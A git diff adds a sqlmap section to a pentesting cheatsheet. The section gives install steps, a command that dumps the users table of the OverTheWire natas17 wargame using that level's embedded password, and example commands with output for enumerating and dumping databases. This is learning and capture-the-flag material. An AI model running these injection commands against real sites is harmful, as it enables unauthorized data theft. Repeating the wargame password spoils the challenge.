@@ -9,6 +9,7 @@ Cheatsheet for various unix tools such as enumeration, nmap, radare2 and volatil
 ## Introduction
 <style>#introduction:before{content: "";counter-increment: h2 -1}</style>
 1. [Network scanning with nmap](#nmap)
+1. [SQL injection with sqlmap](#sqlmap)
 1. [Reverse engineering with radare2](#radare2)
 1. [Memdump forensics with volatility](#volatility)
 1. [Wordlist & dictionnaries](#dictionnaries)
@@ -63,7 +64,62 @@ $ nmap {h} -p 40000-45000 # scan from ports 40000 to 45000
 
 - https://www.digitalocean.com/community/tutorials/how-to-use-nmap-to-scan-for-open-ports-on-your-vps
 
+## sqlmap
 
+### Install
+Requires Python 2.*
+```bash
+$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+$ cd sqlmap-dev
+$ python2 ./sqlmap.py
+```
+
+--auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 --dbms="MySQL 5.5" -p username --technique T -D natas17 -T users -C username,password --dump
+
+### Usage
+Find an injectable GET/POST param, such as `?user=love`.
+```bash
+$ sqlmap -x "url.com/sitemap.xml" # sitemap
+$ sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" # SQL connection string for direct access
+$ sqlmap -u "url.com?user=love" -p user # url with param
+$ sqlmap -u "url.com?user=love" --auth-type=BASIC --auth-cred="clear_user:clear_pwd" # basic auth
+$ sqlmap -u "url.com?user=love" --dbms="MySQL 5.5" # set the DNMS to MySQL to test only against it
+$ sqlmap -u "url.com?user=love" -p user --level 3 --dbs # find databases
+available databases [2]:
+[*] information_schema
+[*] pentest_me
+$ sqlmap -u "url.com?user=love" -p user --level 3 -D pentest_me --tables # find tables
+Database: pentest_me
+[1 table]
++--------+
+| table1 |
++--------+
+$ sqlmap -u "url.com?user=love" -p user --level 3 -D pentest_me -T table1 --columns # find columns
+Database: pentest_me
+Table: table1
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| col1     | varchar(64) |
+| col2     | varchar(12) |
++----------+-------------+
+$ sqlmap -u "url.com?user=love" -p user --level 3 -D pentest_me -T table1 -C "col1,col2" --dump # dump rows
+Database: pentest_me
+Table: table1
+[3 entries]
++----------+----------------------------------+
+| col1     | col2                             |
++----------+----------------------------------+
+| user1    | 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |
+| user2    | MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 |
+| user3    | VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD |
++----------+----------------------------------+
+```
+
+Reference
+- https://github.com/sqlmapproject/sqlmap/wiki/Usage
+- https://github.com/sqlmapproject/sqlmap/wiki/Presentations
 
 ## radare2
 Useful links
@@ -121,7 +177,8 @@ $ r2 my_bin # for UNIX
 ```
 
 ## volatility
-Install:
+
+### Install:
 ```bash
 $ wget http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_mac64_standalone.zip<br/>
 $ unzip volatility_2.6_mac64_standalone.zip
@@ -131,7 +188,7 @@ $ volatility -h
 ```
 
 
-Usage:
+### Usage:
 ```bash
 $ volatility -f file.raw imageinfo # Image info
 $ volatility -f file.raw --profile=Win7SP1x86 pslist # Process list
